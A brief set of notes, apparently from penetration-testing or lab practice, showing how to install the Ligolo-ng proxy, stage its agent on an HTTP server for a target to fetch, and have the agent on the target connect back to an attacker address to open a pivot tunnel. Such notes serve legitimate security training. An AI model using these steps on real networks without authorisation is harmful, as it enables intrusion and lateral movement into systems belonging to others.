# Ligolo-proxy install and setup

cd ~/Downloads
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9.2/ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz

tar -xvzf ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz

mv proxy ligolo-proxy

chmod +x ligolo-proxy

sudo mv ligolo-proxy /usr/local/bin/

ligolo-proxy --version

# Download/prepare the Ligolo agent (Upload agent to target)

wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9.2/ligolo-ng_agent_0.9.2_linux_amd64.tar.gz

tar -xvzf ligolo-ng_agent_0.9.2_linux_amd64.tar.gz

cd ~/Downloads
python3 -m http.server 8000

**In target download that agent**

# Start ligolo-proxy

In attacker
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601

In target
./agent -connect 10.10.14.30:11601 -ignore-cert

<img width="951" height="303" alt="image" src="https://github.com/user-attachments/assets/fad5d35f-84fd-458f-97f7-67b1d259f2ed" />

